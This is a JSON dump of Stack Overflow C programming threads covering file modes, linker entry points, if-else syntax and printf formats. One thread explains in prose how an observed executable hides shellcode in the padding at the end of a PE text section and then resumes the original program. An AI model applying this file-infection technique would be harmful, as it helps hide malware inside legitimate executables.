1499274003, "post_id": 44929610, "comment_id": 76839988, "body": "Ok I think I will go with doing the line terminator conversion while parsing. It seem to be the best way to do that."}], "tags": [], "owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "is_accepted": true, "score": 1, "last_activity_date": 1499266315, "creation_date": 1499266315, "answer_id": 44929610, "question_id": 44928378, "link": "https://stackoverflow.com/questions/44928378/open-non-text-file-without-windows-line-ending/44929610#44929610", "title": "Open non text file without windows line ending", "body": "<blockquote>\n  <p>If my understanding is correct the <code>rb</code> mode is used because sometimes the file can be a spreadsheet and therefore the programs just want the information as in a text file.</p>\n</blockquote>\n\n<p>You seem uncertain, and though perhaps you do understand correctly, your explanation does not give me any confidence in that.</p>\n\n<p>C knows about two distinct kinds of streams: binary streams and text streams.  A binary stream is simply an ordered sequence of bytes, written and / or read as-is without any kind of transformation.  On the other hand,</p>\n\n<blockquote>\n  <p>A text stream is an ordered sequence of characters composed into\n  lines, each line consisting of zero or more characters plus a\n  terminating new-line character. Whether the last line requires a\n  terminating new-line character is implementation-defined. <strong>Characters\n  may have to be added, altered, or deleted on input and output to\n  conform to differing conventions for representing text in the host\n  environment. Thus, there need not be a one- to-one correspondence\n  between the characters in a stream and those in the external\n  representation.</strong> [...]</p>\n</blockquote>\n\n<p>(<a href=\"http://port70.net/~nsz/c/c11/n1570.html#7.21.2p2\" rel=\"nofollow noreferrer\">C2011 7.21.2/2</a>)</p>\n\n<p>For some implementations, such as POSIX-compliant ones, this is a distinction without a difference.  For other implementations, such as those targeting Windows, the difference matters.  In particular, on Windows, text streams convert on the fly between carriage-return / line-feed pairs in the external representation and newlines (only) in the internal representation.</p>\n\n<p>The <code>b</code> in your <code>fopen()</code> mode specifies that the file should be opened as a binary stream -- that is, no translation will be performed on the bytes read from the file.  Whether this is the right thing to do depends on your environment and the application's requirements.  This is moot on Linux or another Unix, however, as there is no observable difference between text and binary streams on such systems.</p>\n\n<p><code>dos2unix</code> converts carriage-return / line-feed pairs in the input file to single line-feed (newline) characters.  This will convert a Windows-style text file or one with mixed Windows / Unix line terminators to Unix text file convention.  It is irreversible if there are both Windows-style and Unix-style line terminators in the file, and it is furthermore likely to corrupt your file if it is not a text file in the first place.</p>\n\n<p>If your inputs are sometimes binary files then opening in binary mode is appropriate, and conversion via <code>dos2unix</code> probably is not.  If that's the case and you also need translation for text-file line terminators, then you first and foremost need a way to distinguish which case applies for any particular file -- for example, by command-line argument or by pre-analyzing the file via libmagic.  You then must provide different handling for text files; your main options are</p>\n\n<ol>\n<li>Perform the line terminator conversion in your own code.</li>\n<li>Provide separate versions of the <code>fetchFile()</code> function for text and binary files.</li>\n</ol>\n"}], "owner": {"reputation": 877, "user_id": 1527152, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/70137d1d63d9196b42844848bcc6f11f?s=128&d=identicon&r=PG", "display_name": "user1527152", "link": "https://stackoverflow.com/users/1527152/user1527152"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 118, "favorite_count": 0, "accepted_answer_id": 44929610, "answer_count": 2, "score": -1, "last_activity_date": 1499266315, "creation_date": 1499263178, "last_edit_date": 1499264214, "question_id": 44928378, "link": "https://stackoverflow.com/questions/44928378/open-non-text-file-without-windows-line-ending", "title": "Open non text file without windows line ending", "body": "<p>I took over a project that use the following function to <code>read</code> files:</p>\n\n<pre><code>char *fetchFile(char *filename) {\n    char *buffer;\n    int len;\n    FILE *f = fopen(filename, \"rb\");\n    if(f) {\n        if(verbose) {\n            fprintf(stdout, \"Opened file %s successfully\\n\", filename);\n        }\n        fseek(f, 0, SEEK_END);\n        len = ftell(f);\n        fseek(f, 0, SEEK_SET);\n        if(verbose) {\n            fprintf(stdout, \"Allocating memory for buffer for %s\\n\", filename);\n        }\n        buffer = malloc(len + 1);\n        if(buffer) fread (buffer, 1, len, f);\n        fclose (f);\n        buffer[len] = '\\0';\n    } else {\n        fprintf(stderr, \"Error reading file %s\\n\", filename);\n        exit(1);\n    }\n    return buffer;\n}\n</code></pre>\n\n<p>The <code>rb</code> mode is used because sometimes the file can be a spreadsheet and therefore I want the information as in a text file.</p>\n\n<p>The program runs on a linux machine but the files to read come from linux and windows.</p>\n\n<p>I am not sure of <strong>what approach is better</strong> to not have windows line ending mess with my code.</p>\n\n<p>I was thinking of using <code>dos2unix</code> at the start of this function.\nI also thought of opening in <code>r</code> mode, but I believe that could potentially mess things up when opening non-text files. </p>\n\n<p>I would like to understand better the differences between using: </p>\n\n<ol>\n<li><code>dos2unix</code>, </li>\n<li><code>r</code> vs <code>rb</code> mode, </li>\n<li>or any other solution which would fit\nbetter the problem.</li>\n</ol>\n\n<p>Note: I believe that I understand <code>r</code> vs <code>rb</code> modes, but if you could explain why it is a bad or good solution for this specific situation (I think it wouldn't be good because sometimes it opens spreadsheets but I am not sure of that). </p>\n"}, {"tags": ["c", "linker", "ld", "osdev", "lld"], "comments": [{"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1499262681, "post_id": 44928059, "comment_id": 76831797, "body": "Possible duplicate of <a href=\"https://stackoverflow.com/questions/19470666/gcc-how-to-tell-gcc-to-put-the-main-function-at-the-start-of-the-text-sectio\">GCC: how to tell GCC to put the &#39;main&#39; function at the start of the .text section?</a>"}, {"owner": {"reputation": 61409, "user_id": 485343, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/e18b024a122df74275dd2c4486e8a2b4?s=128&d=identicon&r=PG", "display_name": "rustyx", "link": "https://stackoverflow.com/users/485343/rustyx"}, "edited": false, "score": 0, "creation_date": 1499262731, "post_id": 44928059, "comment_id": 76831851, "body": "Possible duplicate of <a href=\"https://stackoverflow.com/questions/42301831/change-entry-point-with-gnu-linker\">Change entry point with gnu linker</a>"}, {"owner": {"reputation": 17054, "user_id": 5636775, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/GC9DT.gif?s=128&g=1", "display_name": "Ctx", "link": "https://stackoverflow.com/users/5636775/ctx"}, "edited": false, "score": 2, "creation_date": 1499264062, "post_id": 44928059, "comment_id": 76832855, "body": "The ELF entry point will be correctly set to the symbol kmain. But you specified <i>binary</i> as output format! So you do not have an ELF header any more specifying kmain as entry. What you really want is probably to have kmain at the very beginning of your binary, correct?"}, {"owner": {"reputation": 1128, "user_id": 3323667, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/f105997f6492c04a2a21ed27608be0b4?s=128&d=identicon&r=PG", "display_name": "PovilasB", "link": "https://stackoverflow.com/users/3323667/povilasb"}, "reply_to_user": {"reputation": 17054, "user_id": 5636775, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/GC9DT.gif?s=128&g=1", "display_name": "Ctx", "link": "https://stackoverflow.com/users/5636775/ctx"}, "edited": false, "score": 0, "creation_date": 1499334162, "post_id": 44928059, "comment_id": 76865705, "body": "@Ctx yes, that&#39;s the case."}, {"owner": {"reputation": 2747, "user_id": 220594, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/2471c61947385b1d7c0be89482373c26?s=128&d=identicon&r=PG", "display_name": "Pyjong", "link": "https://stackoverflow.com/users/220594/pyjong"}, "edited": false, "score": 1, "creation_date": 1506957509, "post_id": 44928059, "comment_id": 80011322, "body": "Is the entry point parameter completely unused when linking to binary format?"}, {"owner": {"reputation": 1128, "user_id": 3323667, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/f105997f6492c04a2a21ed27608be0b4?s=128&d=identicon&r=PG", "display_name": "PovilasB", "link": "https://stackoverflow.com/users/3323667/povilasb"}, "reply_to_user": {"reputation": 2747, "user_id": 220594, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/2471c61947385b1d7c0be89482373c26?s=128&d=identicon&r=PG", "display_name": "Pyjong", "link": "https://stackoverflow.com/users/220594/pyjong"}, "edited": false, "score": 1, "creation_date": 1507027466, "post_id": 44928059, "comment_id": 80039372, "body": "@Pyjong yes, from what I&#39;ve observed, it&#39;s unused."}, {"owner": {"reputation": 2747, "user_id": 220594, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/2471c61947385b1d7c0be89482373c26?s=128&d=identicon&r=PG", "display_name": "Pyjong", "link": "https://stackoverflow.com/users/220594/pyjong"}, "edited": false, "score": 0, "creation_date": 1507035133, "post_id": 44928059, "comment_id": 80044091, "body": "@PovilasB Ok, thanks!"}], "owner": {"reputation": 1128, "user_id": 3323667, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/f105997f6492c04a2a21ed27608be0b4?s=128&d=identicon&r=PG", "display_name": "PovilasB", "link": "https://stackoverflow.com/users/3323667/povilasb"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 760, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1499262367, "creation_date": 1499262367, "question_id": 44928059, "link": "https://stackoverflow.com/questions/44928059/raw-binary-entry-point", "title": "Raw binary entry point", "body": "<p>I'm having issues in specifying the entry point for my hobby OS kernel.</p>\n\n<p>There is a simple bootloader that loads the kernel code to <code>0x6400000</code> address and jumps there.</p>\n\n<p>Then I have this linker command which outputs kernel with the starting address:</p>\n\n<pre><code>ld --Ttext 0x6400000 -m elf_i386 --oformat binary -e kmain main.o -o main.bin\n</code></pre>\n\n<p>There's <code>main.cc</code> with the entry point function:</p>\n\n<pre><code>void kmain() { // ... }\n</code></pre>\n\n<p>Everything works fine as long as <code>kmain()</code> is the very first defined function.\nIf it's not:</p>\n\n<pre><code>void do_smth() { // ... }\n\nvoid kmain() \n{\n    do_smth();\n}\n</code></pre>\n\n<p>Then <code>ld</code> (and <code>lld</code>) ignores the <code>-e kmain</code> argument, and makes the <code>do_smth()</code> an entry point.</p>\n\n<p>How could I force <code>ld</code> to make <code>kmain()</code> an entry point with an address of <code>0x6400000</code>?</p>\n"}, {"tags": ["c", "gcc"], "comments": [{"owner": {"reputation": 6675, "user_id": 854742, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3dc3befe29d589c7c34fd1600affc041?s=128&d=identicon&r=PG", "display_name": "Carey Gregory", "link": "https://stackoverflow.com/users/854742/carey-gregory"}, "edited": false, "score": 12, "creation_date": 1499261678, "post_id": 44927707, "comment_id": 76831060, "body": "Correct, yes. Formatted horribly, yes."}, {"owner": {"reputation": 29294, "user_id": 2659313, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/9828b91aef4c2b3cf14f3501e0a20e33?s=128&d=identicon&r=PG", "display_name": "Mohit Jain", "link": "https://stackoverflow.com/users/2659313/mohit-jain"}, "edited": false, "score": 0, "creation_date": 1499261988, "post_id": 44927707, "comment_id": 76831314, "body": "Similar question in C++: <a href=\"https://stackoverflow.com/questions/35985592/is-if-condition-try-legal-in-c/35985655#35985655\" title=\"is if condition try legal in c\">stackoverflow.com/questions/35985592/&hellip;</a>"}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 5, "creation_date": 1499267635, "post_id": 44927707, "comment_id": 76835832, "body": "Related fun fact: The C language actually does not have an <code>else if</code> statement. It is an <code>else</code> statement without braces followed by another <code>if</code> statement. <code>else if(a==b){ }</code> is a brace-less, strangely indented version of <code>else &#47;* new line *&#47; { if(a==b){} }</code>."}, {"owner": {"reputation": 41, "user_id": 4737363, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/04fd78d11d8302e5dacce4375b4a63a0?s=128&d=identicon&r=PG&f=1", "display_name": "Piotr", "link": "https://stackoverflow.com/users/4737363/piotr"}, "reply_to_user": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1499268470, "post_id": 44927707, "comment_id": 76836431, "body": "@Lundin That&#39;s right. IMO many books and tutorials suggest that <code>else if</code> is a statement but actually it is not"}], "answers": [{"tags": [], "owner": {"reputation": 82712, "user_id": 598696, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/k1Yif.png?s=128&g=1", "display_name": "Vittorio Romeo", "link": "https://stackoverflow.com/users/598696/vittorio-romeo"}, "is_accepted": true, "score": 9, "last_activity_date": 1499261548, "creation_date": 1499261548, "answer_id": 44927750, "question_id": 44927707, "link": "https://stackoverflow.com/questions/44927707/if-else-switch-statement/44927750#44927750", "title": "If ... else switch ... statement", "body": "<p>There's nothing wrong with your code. The <a href=\"http://en.cppreference.com/w/cpp/language/if\" rel=\"noreferrer\">grammar for <code>if</code> ... <code>else</code></a> is as follows:</p>\n\n<blockquote>\n  <p>attr(optional) <strong>if</strong> ( condition ) statement-true <strong>else</strong> statement-false   </p>\n</blockquote>\n\n<p><code>switch</code> is a statement, so it is allowed to go after <code>else</code>.</p>\n\n<hr>\n\n<p>Note that <code>else if</code> is not a special construct either, it's just an <code>if</code> statement after an <code>else</code>.</p>\n"}, {"tags": [], "owner": {"reputation": 362958, "user_id": 28169, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/ec9385dc533f1a6a93769077f852503e?s=128&d=identicon&r=PG", "display_name": "unwind", "link": "https://stackoverflow.com/users/28169/unwind"}, "is_accepted": false, "score": 3, "last_activity_date": 1499261561, "creation_date": 1499261561, "answer_id": 44927753, "question_id": 44927707, "link": "https://stackoverflow.com/questions/44927707/if-else-switch-statement/44927753#44927753", "title": "If ... else switch ... statement", "body": "<p>The <code>switch</code> is a statement, so this is just putting a statement in the <code>else</code>.</p>\n\n<p>It's no different from</p>\n\n<pre><code>else\n  a = 0;\n</code></pre>\n\n<p>or</p>\n\n<pre><code>else\n{\n  switch(a)\n  {\n  case 1:\n  ...\n  }\n}\n</code></pre>\n\n<p>It's not a very common way of writing it, but it's fine.</p>\n"}, {"tags": [], "owner": {"reputation": 29294, "user_id": 2659313, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/9828b91aef4c2b3cf14f3501e0a20e33?s=128&d=identicon&r=PG", "display_name": "Mohit Jain", "link": "https://stackoverflow.com/users/2659313/mohit-jain"}, "is_accepted": false, "score": 2, "last_activity_date": 1499261581, "creation_date": 1499261581, "answer_id": 44927761, "question_id": 44927707, "link": "https://stackoverflow.com/questions/44927707/if-else-switch-statement/44927761#44927761", "title": "If ... else switch ... statement", "body": "<p>Syntax of <code>if</code> is:</p>\n\n<pre><code>if ( condition ) statement-true  else statement-false\ncondition is an expression convertible to a boolean (true/false)\nstatement-true is a statement which is executed if condition is true\nstatement-false is a statement which is executed if condition is false\n</code></pre>\n\n<p>And <code>switch</code> block is a statement.</p>\n\n<p>So yes, your code exhibit correct statement.</p>\n"}, {"tags": [], "owner": {"reputation": 3890, "user_id": 3626078, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/SBXjb.jpg?s=128&g=1", "display_name": "magicleon94", "link": "https://stackoverflow.com/users/3626078/magicleon94"}, "is_accepted": false, "score": 3, "last_activity_date": 1499261663, "creation_date": 1499261663, "answer_id": 44927787, "question_id": 44927707, "link": "https://stackoverflow.com/questions/44927707/if-else-switch-statement/44927787#44927787", "title": "If ... else switch ... statement", "body": "<p>Nothing wrong with your code, that is the same of writing this:</p>\n\n<pre><code>if (a == 0) {\n    puts(\"0\");\n} else {\n    switch (a) {\n        case 1: puts(\"1\"); break;\n        case 2: puts(\"2\"); break;\n        default: puts(\"default\"); break;\n    }\n}\n</code></pre>\n\n<p>That is perfectly legit. <code>else switch</code> is not a real statement. <br><br>Your statement is </p>\n\n<pre><code>if(condition){code block} else {code block}\n</code></pre>\n\n<p><code>code block</code> can contain any statement, such as your <code>switch</code> statement.</p>\n"}, {"tags": [], "owner": {"reputation": 5623, "user_id": 1347519, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/a9e1eb6e25803528d25f57f3df79e115?s=128&d=identicon&r=PG", "display_name": "Attie", "link": "https://stackoverflow.com/users/1347519/attie"}, "is_accepted": false, "score": 4, "last_activity_date": 1499263146, "last_edit_date": 1499263146, "creation_date": 1499261677, "answer_id": 44927791, "question_id": 44927707, "link": "https://stackoverflow.com/questions/44927707/if-else-switch-statement/44927791#44927791", "title": "If ... else switch ... statement", "body": "<p>What you have is syntactically correct... but it does not make easy reading.</p>\n\n<p>You will likely be pulled up on it if your code is being reviewed - because you're making use of an \"<em>un-braced, multi-line statement as part of a conditional</em>\".</p>\n\n<p>Prefer to be explicit and write it like so:</p>\n\n<pre><code>if (a == 0) {\n    puts(\"0\");\n} else {\n    switch (a) {\n        case 1: puts(\"1\"); break;\n        case 2: puts(\"2\"); break;\n        default: puts(\"default\"); break;\n    }\n}\n</code></pre>\n\n<hr>\n\n<p>It is legal in the same way that the following is legal:</p>\n\n<pre><code>if (a == 0)\n    puts(\"0\");\nelse\n    puts(\"not0\");\n</code></pre>\n\n<p>Such constructs can lead to mistakes when re-visiting the code... I seem to remember that one of the recent \"popular\" vulnerabilities was implemented (by mistake... hopefully) in part due to this \"<em>un-braced</em>\" use of <code>if</code>.</p>\n"}], "owner": {"reputation": 41, "user_id": 4737363, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/04fd78d11d8302e5dacce4375b4a63a0?s=128&d=identicon&r=PG&f=1", "display_name": "Piotr", "link": "https://stackoverflow.com/users/4737363/piotr"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1263, "favorite_count": 0, "accepted_answer_id": 44927750, "answer_count": 5, "score": 3, "last_activity_date": 1499263146, "creation_date": 1499261446, "question_id": 44927707, "link": "https://stackoverflow.com/questions/44927707/if-else-switch-statement", "title": "If ... else switch ... statement", "body": "<p>Following code compiles on my gcc 5.4.0, doesn't generate any warnings and works fine:</p>\n\n<pre><code>if (a == 0) {\n    puts(\"0\");\n} else switch (a) {\n    case 1: puts(\"1\"); break;\n    case 2: puts(\"2\"); break;\n    default: puts(\"default\"); break;\n}\n</code></pre>\n\n<p>Is <em>if ... else switch ...</em> correct statement?</p>\n"}, {"tags": ["c++", "c", "windows", "exe", "portable-executable"], "answers": [{"comments": [{"owner": {"reputation": 856, "user_id": 4881854, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/ad097f53a73b499090fdadaf695470c9?s=128&d=identicon&r=PG&f=1", "display_name": "Ojs", "link": "https://stackoverflow.com/users/4881854/ojs"}, "edited": false, "score": 0, "creation_date": 1499325034, "post_id": 44931110, "comment_id": 76859769, "body": "thank you for reply :) but even if code is added, only the <code>VirtualSize</code> of <code>.txt</code> section would be loaded when executing right?"}, {"owner": {"reputation": 4522, "user_id": 5157478, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/bBcym.png?s=128&g=1", "display_name": "Frankie_C", "link": "https://stackoverflow.com/users/5157478/frankie-c"}, "reply_to_user": {"reputation": 856, "user_id": 4881854, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/ad097f53a73b499090fdadaf695470c9?s=128&d=identicon&r=PG&f=1", "display_name": "Ojs", "link": "https://stackoverflow.com/users/4881854/ojs"}, "edited": false, "score": 0, "creation_date": 1499327244, "post_id": 44931110, "comment_id": 76861144, "body": "Difficult to say if any control is made on the size. Considering that the section itself will be extended to a multiple of architecture page (PECOFF spec), some OS versions loaders could simply copy the whole block. <b>But anyway after so heavy modifications to change also the <code>VirtualSize</code> value is not a big deal...</b>"}, {"owner": {"reputation": 856, "user_id": 4881854, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/ad097f53a73b499090fdadaf695470c9?s=128&d=identicon&r=PG&f=1", "display_name": "Ojs", "link": "https://stackoverflow.com/users/4881854/ojs"}, "edited": false, "score": 0, "creation_date": 1499327623, "post_id": 44931110, "comment_id": 76861389, "body": "So your saying that <code>VirtualSize</code> isn&#39;t a big deal and loader will copy the whole block, meaning it will extend actual <code>.txt</code> section to a architecture page. Does this mean that <code>.txt</code> sections size which will be loaded will always be <code>RawDataSize</code>? Sorry if I misunderstood soemthing."}, {"owner": {"reputation": 4522, "user_id": 5157478, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/bBcym.png?s=128&g=1", "display_name": "Frankie_C", "link": "https://stackoverflow.com/users/5157478/frankie-c"}, "reply_to_user": {"reputation": 856, "user_id": 4881854, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/ad097f53a73b499090fdadaf695470c9?s=128&d=identicon&r=PG&f=1", "display_name": "Ojs", "link": "https://stackoverflow.com/users/4881854/ojs"}, "edited": false, "score": 0, "creation_date": 1499329156, "post_id": 44931110, "comment_id": 76862397, "body": "I didn&#39;t say that. I said that after copying the data in the file, modifying also the <code>virtualSize</code> field at offset 0x8 adding the size of copied data cold be done to be sure the it will be loaded. <b>But at this point I really think we have talked too much of something that is not standard coding, and shouldn&#39;t be discussed because useful for bad practices.</b>"}], "tags": [], "owner": {"reputation": 4522, "user_id": 5157478, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/bBcym.png?s=128&g=1", "display_name": "Frankie_C", "link": "https://stackoverflow.com/users/5157478/frankie-c"}, "is_accepted": false, "score": 1, "last_activity_date": 1499270557, "creation_date": 1499270557, "answer_id": 44931110, "question_id": 44927518, "link": "https://stackoverflow.com/questions/44927518/pe-adding-code-at-the-end-of-txt-section/44931110#44931110", "title": "PE: Adding code at the end of .txt section", "body": "<p>Uhmmm, this hack code seems crafted to hide malicious code between sections.</p>\n\n<p>Going to your question, you are correct VirtualSize is the space really allocated in memory and RawSize is the the space used on disk to hold the section data.\nWhat you missed is (from MS PECOFF spec):</p>\n\n<blockquote>\n  <p><code>VirtualSize</code>:    The total size of the section when loaded into memory. If this value is greater than <code>SizeOfRawData</code>, the section is zero-padded. This field is valid only for executable images and should be set to zero for object files.</p>\n</blockquote>\n\n<p>This means that <strong>if a the result of <code>SizeOfRawData</code>-<code>VirtualSize</code> is positive we have some space available on disk actually filled with 0's</strong>.</p>\n\n<p>If that space is enough to hold the malicious code then adding the start of text section on disk with the <code>VirtualSize</code> you can get the start of 0's padded area that can be used to copy the code.</p>\n\n<p>The rest is story...</p>\n"}, {"comments": [{"owner": {"reputation": 25518, "user_id": 6401656, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/jtwou.jpg?s=128&g=1", "display_name": "RbMm", "link": "https://stackoverflow.com/users/6401656/rbmm"}, "edited": false, "score": 1, "creation_date": 1499468523, "post_id": 44958653, "comment_id": 76936917, "body": "<code>VirtualSize represents the unrounded size of the section</code> this absolute wrong. <code>VirtualSize</code> - this how many memory reserved for section. <code>SizeOfRawData</code> - this is how many bytes have section on disk. for example section (<code>.bss</code>) have uninitialized data - in this case <code>SizeOfRawData</code> will be 0 - so <code>VirtualSize</code> &gt; <code>SizeOfRawData</code>. from another size, because <code>SizeOfRawData</code> rounded to FileAligment (usual 512 bytes) can be and <code>VirtualSize &lt; SizeOfRawData</code>."}, {"owner": {"reputation": 1075, "user_id": 5377688, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/NpeXm.png?s=128&g=1", "display_name": "byteptr", "link": "https://stackoverflow.com/users/5377688/byteptr"}, "edited": false, "score": 0, "creation_date": 1499542970, "post_id": 44958653, "comment_id": 76955010, "body": "The question wasn&#39;t about uninitialized data sections where SizeOfRawData=0; even in that case VirtualSize is still going to be the unrounded size of the section &quot;in memory&quot;, there is just nothing to copy from disk. In almost any other case, the statement I made is a true implementation detail.  I agree its confusing and appears contrary to the spec, but this statement reflects how the MS Linker (and linkers that copied their behavior) are implemented. This also includes GNU and Borland Linkers.  Also note that a linker could round VirtualSize and still have a working executable."}, {"owner": {"reputation": 1075, "user_id": 5377688, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/NpeXm.png?s=128&g=1", "display_name": "byteptr", "link": "https://stackoverflow.com/users/5377688/byteptr"}, "edited": false, "score": 0, "creation_date": 1499543171, "post_id": 44958653, "comment_id": 76955064, "body": "As a side note on legacy behavior, Borland TLINK 4.x (from the early 90s) had VirtualSize and SizeOfRawData interchanged"}], "tags": [], "owner": {"reputation": 1075, "user_id": 5377688, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/NpeXm.png?s=128&g=1", "display_name": "byteptr", "link": "https://stackoverflow.com/users/5377688/byteptr"}, "is_accepted": true, "score": 1, "last_activity_date": 1499457271, "last_edit_date": 1499457271, "creation_date": 1499374370, "answer_id": 44958653, "question_id": 44927518, "link": "https://stackoverflow.com/questions/44927518/pe-adding-code-at-the-end-of-txt-section/44958653#44958653", "title": "PE: Adding code at the end of .txt section", "body": "<p>This is a great question and illustrates a very important point (or you might say quirk) about how the Windows loader calculates memory sizes.</p>\n\n<p>The PE/COFF spec does indeed describe VirtualSize as \"The total size of the section when loaded into memory\".  This is technically true if you consider total to be the total amount of REAL data that comprises the section, but it is not the total amount of memory Windows allocates for the section.  You'll find VirtualSize is often LESS than the amount Windows allocates for the section in memory because VirtualSize must be rounded UP to the nearest memory alignment value (set in the PE image).</p>\n\n<p>In other words, VirtualSize represents the unrounded size of the section while SizeOfRawData is the size of the data in the image file, but rounded up to the nearest file alignment padding value.  This is the reason VirtualSize is the better representation of the true \"raw\" size of the data, in memory or on disk.  The PE/COFF spec does not make this distinction.  Why one is rounded in the image file and not the other probably has its ancient roots in backwards compatibility.</p>\n\n<p>This is precisely why your shellcode uses VirtualSize to find the \"real\" end of data even as it resides in the image file.  Not surprisingly, you can calculate SizeOfRawData by rounding VirtualSize up to the file alignment's value, at least in well formed PE files.</p>\n\n<p>The shellcode simply used VirtualSize to find the end of the REAL code.  Between there and SizeOfRawData bytes, are just unused padding zeroes, making it a prime spot to add new code without affecting the size of the file or breaking addressing offsets within the PE file.</p>\n\n<p>In summary, the Windows loader essentially takes the VirtualSize value and rounds it up to the memory alignment value to get the real size of the memory allocation (and even this may be rounded up to the nearest 4k-minimum memory page).  Then up to SizeOfRawData bytes are copied from the file to the beginning of the memory section.  If it is less than the size of the section in memory, the remainder is zero filled.</p>\n"}], "owner": {"reputation": 856, "user_id": 4881854, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/ad097f53a73b499090fdadaf695470c9?s=128&d=identicon&r=PG&f=1", "display_name": "Ojs", "link": "https://stackoverflow.com/users/4881854/ojs"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1698, "favorite_count": 1, "accepted_answer_id": 44958653, "answer_count": 2, "score": 4, "last_activity_date": 1499457271, "creation_date": 1499260983, "last_edit_date": 1499262837, "question_id": 44927518, "link": "https://stackoverflow.com/questions/44927518/pe-adding-code-at-the-end-of-txt-section", "title": "PE: Adding code at the end of .txt section", "body": "<p>As I understand in <code>PE</code> file Virtual Size shows how much space it allocates for section during loading and Raw Size shows how big the section is on disk.</p>\n\n<p>I came across to this executable which did the following:</p>\n\n<p>It subtracted the virtual size (<code>offset 0x8</code>) from the raw data size (<code>offset 0x10</code>) and made sure there was some space(for example 100 bytes). At offset <code>0x14</code> from the text section header it found the offset in the file for the section itself. It added to this the virtual size, finding right where the section ends in the file. it copied some shellcode(which at the end eventually jumped to the original entry point of an executable to make sure original executable ran) to the end of the text section of the binary.</p>\n\n<p>Now I'm little confused here, if the Virtual Size shows the exact space which will be allocated for executable, would not adding code at the end of <code>.txt</code> section overwrite some other data of executable and make it crash? thanks.</p>\n"}, {"tags": ["c", "sizeof"], "comments": [{"owner": {"reputation": 6023, "user_id": 2417459, "user_type": "registered", "accept_rate": 57, "profile_image": "https://i.stack.imgur.com/QcuXb.png?s=128&g=1", "display_name": "i486", "link": "https://stackoverflow.com/users/2417459/i486"}, "edited": false, "score": 0, "creation_date": 1499261220, "post_id": 44927489, "comment_id": 76830685, "body": "Which compiler / platform? I think it will work in most cases. It is better to add <code>\\n</code> after <code>%d</code> like <code>printf(&quot;%d\\n&quot;, sizeof...);</code>"}, {"owner": {"user_type": "does_not_exist", "display_name": "user1531971"}, "edited": false, "score": 0, "creation_date": 1499262382, "post_id": 44927489, "comment_id": 76831589, "body": "&quot;This does not work&quot;. Exactly, how does it not work. Show your steps to reproduce your problem."}, {"owner": {"reputation": 17, "user_id": 6940527, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ed42a2a967f2f6e0819a058dc69eb001?s=128&d=identicon&r=PG&f=1", "display_name": "paras ghai", "link": "https://stackoverflow.com/users/6940527/paras-ghai"}, "edited": false, "score": 0, "creation_date": 1499263438, "post_id": 44927489, "comment_id": 76832383, "body": "it was giving compile error but I got the answer with %zu !"}, {"owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "edited": false, "score": 0, 